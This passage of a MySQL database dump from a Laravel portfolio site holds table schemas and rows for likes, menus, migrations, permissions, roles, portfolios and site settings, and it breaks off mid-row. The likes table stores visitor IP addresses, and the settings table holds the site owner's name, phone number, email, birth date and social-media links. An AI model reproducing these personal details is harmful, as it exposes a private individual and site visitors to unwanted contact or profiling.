  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `likes_likable_id_likable_type_index` (`likable_id`,`likable_type`),
  KEY `likes_user_id_index` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=34 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `likes`
--

LOCK TABLES `likes` WRITE;
/*!40000 ALTER TABLE `likes` DISABLE KEYS */;
INSERT INTO `likes` VALUES (2,NULL,'5.215.121.19',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(3,NULL,'5.213.233.83',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(4,NULL,'2.187.64.6',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(5,NULL,'46.164.78.61',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(6,NULL,'178.251.212.114',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(7,NULL,'2.191.83.198',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(8,NULL,'164.132.41.22',1,3,'App\\Restaurant',1,'2017-05-25 13:13:52','2017-05-25 13:13:52',NULL),(9,NULL,'139.162.181.190',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(10,NULL,'107.167.107.177',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(11,NULL,'2.176.203.180',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(12,NULL,'37.137.184.194',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(13,NULL,'5.208.145.80',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(14,NULL,'5.238.255.51',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(15,NULL,'2.186.228.67',1,3,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(16,NULL,'83.123.66.71',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(17,NULL,'151.242.165.2',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(18,NULL,'46.41.224.73',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(19,NULL,'5.114.135.8',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(20,NULL,'46.41.232.45',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(21,NULL,'5.52.210.171',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(22,NULL,'141.0.13.88',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(23,NULL,'5.121.127.133',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(24,NULL,'86.57.71.5',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(25,NULL,'5.116.210.25',1,2,'App\\Restaurant',1,'2017-05-25 13:13:53','2017-05-25 13:13:53',NULL),(26,NULL,'31.47.32.230',1,4,'App\\Restaurant',1,'2017-10-29 02:57:35','2017-10-29 02:57:35',NULL),(27,1,'45.79.99.186',1,5,'App\\Restaurant',1,'2017-10-30 08:47:43','2017-10-30 08:47:43',NULL),(29,1,'185.112.35.92',1,1,'App\\Restaurant',1,'2017-11-13 14:02:42','2017-11-13 14:02:42',NULL),(30,1,'185.112.35.92',1,10,'App\\Restaurant',1,'2017-11-14 15:29:41','2017-11-14 15:29:41',NULL),(31,NULL,'31.47.32.230',1,11,'App\\Restaurant',1,'2017-12-03 08:02:00','2017-12-03 08:02:00',NULL),(32,1,'31.47.32.230',1,14,'App\\Restaurant',1,'2017-12-26 10:06:13','2017-12-26 10:06:13',NULL),(33,NULL,'31.47.32.230',1,12,'App\\Restaurant',1,'2017-12-30 08:32:21','2017-12-30 08:32:21',NULL);
/*!40000 ALTER TABLE `likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `menus`
--

DROP TABLE IF EXISTS `menus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `menus` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `route` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8_unicode_ci,
  `parent_id` int(11) DEFAULT NULL,
  `lft` int(11) DEFAULT NULL,
  `rgt` int(11) DEFAULT NULL,
  `depth` int(11) DEFAULT NULL,
  `state` int(11) NOT NULL,
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menus_parent_id_index` (`parent_id`),
  KEY `menus_lft_index` (`lft`),
  KEY `menus_rgt_index` (`rgt`),
  KEY `menus_depth_index` (`depth`),
  KEY `menus_created_by_foreign` (`created_by`),
  KEY `menus_updated_by_foreign` (`updated_by`),
  CONSTRAINT `menus_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `menus_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `menus`
--

LOCK TABLES `menus` WRITE;
/*!40000 ALTER TABLE `menus` DISABLE KEYS */;
INSERT INTO `menus` VALUES (1,'منوی اصلی','منوی-اصلی','منوی-اصلی','منوی اصلی',NULL,1,2,0,1,1,1,'2017-04-17 13:48:51','2017-04-17 13:48:51',NULL);
/*!40000 ALTER TABLE `menus` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (1,'2014_10_12_000000_create_users_table',1),(2,'2014_10_12_100000_create_password_resets_table',1),(3,'2017_03_01_083055_create_blogs_table',1),(4,'2017_03_01_090613_create_categories_table',1),(5,'2017_03_01_093937_create_comments_table',1),(6,'2017_03_01_093955_create_tags_table',1),(7,'2017_03_24_130707_add_username_field_to_users_table',1),(8,'2017_03_26_073533_alter_users_table',1),(9,'2017_03_28_085535_entrust_setup_tables',1),(10,'2017_04_02_143123_create_settings_table',1),(11,'2017_04_10_065902_create_menus_table',1),(12,'2017_04_12_060745_create_departments_table',1),(13,'2017_04_12_063354_create_contacts_table',1),(14,'2017_04_15_082726_create_skills_table',1),(15,'2017_04_15_082757_create_experiences_table',1),(16,'2017_04_15_082810_create_educations_table',1),(18,'2017_04_15_101932_create_teams_table',1),(19,'2017_04_15_102330_create_testimonials_table',1),(20,'2017_04_15_095712_create_portfolios_table',2),(21,'2017_05_17_080215_create_likes_table',3);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`),
  KEY `password_resets_token_index` (`token`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pcategories`
--

DROP TABLE IF EXISTS `pcategories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pcategories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pcategories`
--

LOCK TABLES `pcategories` WRITE;
/*!40000 ALTER TABLE `pcategories` DISABLE KEYS */;
INSERT INTO `pcategories` VALUES (1,'shopping',0,'2017-04-18 12:30:43','2017-04-18 12:30:43',NULL),(2,'store',1,'2017-04-18 12:30:43','2017-04-18 13:14:46',NULL);
/*!40000 ALTER TABLE `pcategories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pcategory_portfolio`
--

DROP TABLE IF EXISTS `pcategory_portfolio`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pcategory_portfolio` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `portfolio_id` int(10) unsigned NOT NULL,
  `category_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `pcategory_portfolio_portfolio_id_foreign` (`portfolio_id`),
  KEY `pcategory_portfolio_category_id_foreign` (`category_id`),
  CONSTRAINT `pcategory_portfolio_category_id_foreign` FOREIGN KEY (`category_id`) REFERENCES `pcategories` (`id`),
  CONSTRAINT `pcategory_portfolio_portfolio_id_foreign` FOREIGN KEY (`portfolio_id`) REFERENCES `portfolios` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pcategory_portfolio`
--

LOCK TABLES `pcategory_portfolio` WRITE;
/*!40000 ALTER TABLE `pcategory_portfolio` DISABLE KEYS */;
INSERT INTO `pcategory_portfolio` VALUES (2,1,1),(6,1,2);
/*!40000 ALTER TABLE `pcategory_portfolio` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permission_role`
--

DROP TABLE IF EXISTS `permission_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permission_role` (
  `permission_id` int(10) unsigned NOT NULL,
  `role_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`role_id`),
  KEY `permission_role_role_id_foreign` (`role_id`),
  CONSTRAINT `permission_role_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `permission_role_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permission_role`
--

LOCK TABLES `permission_role` WRITE;
/*!40000 ALTER TABLE `permission_role` DISABLE KEYS */;
INSERT INTO `permission_role` VALUES (1,1),(2,1),(3,1),(4,1),(5,1),(6,1),(7,1),(8,1),(9,1),(10,1),(11,1),(12,1),(13,1),(14,1),(15,1),(16,1),(17,1),(18,1),(19,1),(20,1),(21,1),(22,1),(23,1),(24,1),(25,1),(26,1),(27,1),(28,1),(29,1),(30,1),(31,1),(32,1),(33,1),(34,1),(35,1),(36,1),(37,1),(38,1),(39,1),(40,1),(41,1),(42,1),(43,1),(44,1),(45,1),(46,1),(47,1),(48,1),(49,1),(50,1),(51,1),(52,1),(53,1),(54,1),(55,1),(56,1),(57,1),(58,1),(59,1),(60,1),(61,1),(62,1),(63,1),(64,1),(65,1),(66,1),(67,1),(68,1),(69,1),(70,1),(71,1),(72,1),(73,1),(74,1),(75,1),(76,1);
/*!40000 ALTER TABLE `permission_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permissions`
--

DROP TABLE IF EXISTS `permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permissions` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `display_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `permissions_name_unique` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=77 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permissions`
--

LOCK TABLES `permissions` WRITE;
/*!40000 ALTER TABLE `permissions` DISABLE KEYS */;
INSERT INTO `permissions` VALUES (1,'admin.users.create','Users Create',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(2,'admin.users.read','Users Read',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(3,'admin.users.update','Users Update',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(4,'admin.users.delete','Users Delete',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(5,'admin.roles.create','Roles Create',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(6,'admin.roles.read','Roles Read',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(7,'admin.roles.update','Roles Update',NULL,'2017-04-17 15:04:52','2017-04-17 15:04:52'),(8,'admin.roles.delete','Roles Delete',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(9,'admin.permissions.create','Permissions Create',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(10,'admin.permissions.read','Permissions Read',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(11,'admin.permissions.update','Permissions Update',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(12,'admin.permissions.delete','Permissions Delete',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(13,'admin.blogs.create','Blogs Create',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(14,'admin.blogs.read','Blogs Read',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(15,'admin.blogs.update','Blogs Update',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(16,'admin.blogs.delete','Blogs Delete',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(17,'admin.categories.create','Categories Create',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(18,'admin.categories.read','Categories Read',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(19,'admin.categories.update','Categories Update',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(20,'admin.categories.delete','Categories Delete',NULL,'2017-04-17 15:04:53','2017-04-17 15:04:53'),(21,'admin.translations.create','Translations Create',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(22,'admin.translations.read','Translations Read',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(23,'admin.translations.update','Translations Update',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(24,'admin.translations.delete','Translations Delete',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(25,'admin.settings.create','Settings Create',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(26,'admin.settings.read','Settings Read',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(27,'admin.settings.update','Settings Update',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(28,'admin.settings.delete','Settings Delete',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(29,'admin.comments.create','Comments Create',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(30,'admin.comments.read','Comments Read',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(31,'admin.comments.update','Comments Update',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(32,'admin.comments.delete','Comments Delete',NULL,'2017-04-17 15:04:54','2017-04-17 15:04:54'),(33,'admin.menus.create','Menus Create',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(34,'admin.menus.read','Menus Read',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(35,'admin.menus.update','Menus Update',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(36,'admin.menus.delete','Menus Delete',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(37,'admin.departments.create','Departments Create',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(38,'admin.departments.read','Departments Read',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(39,'admin.departments.update','Departments Update',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(40,'admin.departments.delete','Departments Delete',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(41,'admin.contacts.create','Contacts Create',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(42,'admin.contacts.read','Contacts Read',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(43,'admin.contacts.update','Contacts Update',NULL,'2017-04-17 15:04:55','2017-04-17 15:04:55'),(44,'admin.contacts.delete','Contacts Delete',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(45,'admin.skills.create','Skills Create',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(46,'admin.skills.read','Skills Read',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(47,'admin.skills.update','Skills Update',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(48,'admin.skills.delete','Skills Delete',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(49,'admin.experiences.create','Experiences Create',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(50,'admin.experiences.read','Experiences Read',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(51,'admin.experiences.update','Experiences Update',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(52,'admin.experiences.delete','Experiences Delete',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(53,'admin.educations.create','Educations Create',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(54,'admin.educations.read','Educations Read',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(55,'admin.educations.update','Educations Update',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(56,'admin.educations.delete','Educations Delete',NULL,'2017-04-17 15:04:56','2017-04-17 15:04:56'),(57,'admin.portfolios.create','Portfolios Create',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(58,'admin.portfolios.read','Portfolios Read',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(59,'admin.portfolios.update','Portfolios Update',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(60,'admin.portfolios.delete','Portfolios Delete',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(61,'admin.pcategories.create','Pcategories Create',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(62,'admin.pcategories.read','Pcategories Read',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(63,'admin.pcategories.update','Pcategories Update',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(64,'admin.pcategories.delete','Pcategories Delete',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(65,'admin.teams.create','Teams Create',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(66,'admin.teams.read','Teams Read',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(67,'admin.teams.update','Teams Update',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(68,'admin.teams.delete','Teams Delete',NULL,'2017-04-17 15:04:57','2017-04-17 15:04:57'),(69,'admin.testimonials.create','Testimonials Create',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(70,'admin.testimonials.read','Testimonials Read',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(71,'admin.testimonials.update','Testimonials Update',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(72,'admin.testimonials.delete','Testimonials Delete',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(73,'admin.profile.read','Admin Profile Read',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(74,'admin.profile.update','Admin Profile Update',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(75,'admin.dashboard.read','Admin Dashboard Home Read',NULL,'2017-04-17 15:04:58','2017-04-17 15:04:58'),(76,'admin.databases.read','Admin Databases Home Read','<p><br></p>','2018-01-09 15:30:17','2018-01-09 15:32:30');
/*!40000 ALTER TABLE `permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `portfolios`
--

DROP TABLE IF EXISTS `portfolios`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `portfolios` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `demo_url` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `state` tinyint(4) NOT NULL DEFAULT '0',
  `created_by` int(10) unsigned NOT NULL,
  `updated_by` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `portfolios_created_by_foreign` (`created_by`),
  KEY `portfolios_updated_by_foreign` (`updated_by`),
  CONSTRAINT `portfolios_created_by_foreign` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`),
  CONSTRAINT `portfolios_updated_by_foreign` FOREIGN KEY (`updated_by`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `portfolios`
--

LOCK TABLES `portfolios` WRITE;
/*!40000 ALTER TABLE `portfolios` DISABLE KEYS */;
INSERT INTO `portfolios` VALUES (1,'سفرپردازان عصر نوین','http://safarpardazan.com',NULL,'<p>برنامه‌نویسی فوق العاده قدرتمند<br></p>',1,1,1,'2017-04-18 12:18:37','2017-04-20 12:27:36',NULL);
/*!40000 ALTER TABLE `portfolios` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `role_user`
--

DROP TABLE IF EXISTS `role_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `role_user` (
  `user_id` int(10) unsigned NOT NULL,
  `role_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`user_id`,`role_id`),
  KEY `role_user_role_id_foreign` (`role_id`),
  CONSTRAINT `role_user_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `role_user_user_id_foreign` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `role_user`
--

LOCK TABLES `role_user` WRITE;
/*!40000 ALTER TABLE `role_user` DISABLE KEYS */;
INSERT INTO `role_user` VALUES (1,1);
/*!40000 ALTER TABLE `role_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `display_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `description` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `roles_name_unique` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'admin','admin','admin','2017-04-17 13:48:43','2017-04-17 13:48:43');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `value` text COLLATE utf8_unicode_ci NOT NULL,
  `type` enum('text','textarea','checkbox','image','file') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'text',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `settings_key_unique` (`key`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES (1,'site_title','سعید نصیری | برنامه نویس PHP و Laravel','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(2,'name','سعید نصیری','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(3,'birth_date','1988-04-27','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(4,'address','ایران، تهران','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(5,'tel','09212375850','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(6,'email','saeed.hajinasiri@gmail.com','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(7,'site','http://saeednasiri.com','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(8,'github_url','https://github.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(9,'linkedin_url','https://linkedin.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(10,'googleplus_url','https://plus.google.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(11,'twitter_url','https://twitter.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(12,'facebook_url','https://facebook.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(13,'pinterest_url','https://pinterest.com/saeedhajinasiri','text','2017-04-17 13:48:50','2017-04-17 13:48:50'),(14,'text_story','سلام، من برنامه نویس و طراح وبم.تقریبا هف هش سالی تجربه مستمر دارم تو کارم و تو تمام این مدت تو انجام انواع سایت، تجربه‌ای پیدا کردم و حالا اون تجربیات رو دارم با به‌روزترین تکنولوژی‌ها پیاده می‌کنم.','textarea','2017-04-17 13:48:50','2017-10-18 07:12:45'),(15,'text_skill','فعالیت‌ها و مهارت‌های من روی موارد back-end developer متمرکز میشه و طبیعتا نسبت به دیگر مهارت‌ها توانایی بیشتری روشون دارم.','textarea','2017-04-17 13:48:51','2017-10-18 07:13:14'),(16,'text_experience','طی این سال‌ها که تجربه کار شخصی رو پشت سر میذاشتم، در کنارش با شرکت‌های پرشین‌تولز، لست سکند و فارسیکام هم همکاری داشتم و فک می‌کنم از مهم‌ترین تجربیات هر شخصی کار در یک قالب تیمی و به صورت گروهی بوده باشه.','textarea','2017-04-17 13:48:51','2017-10-18 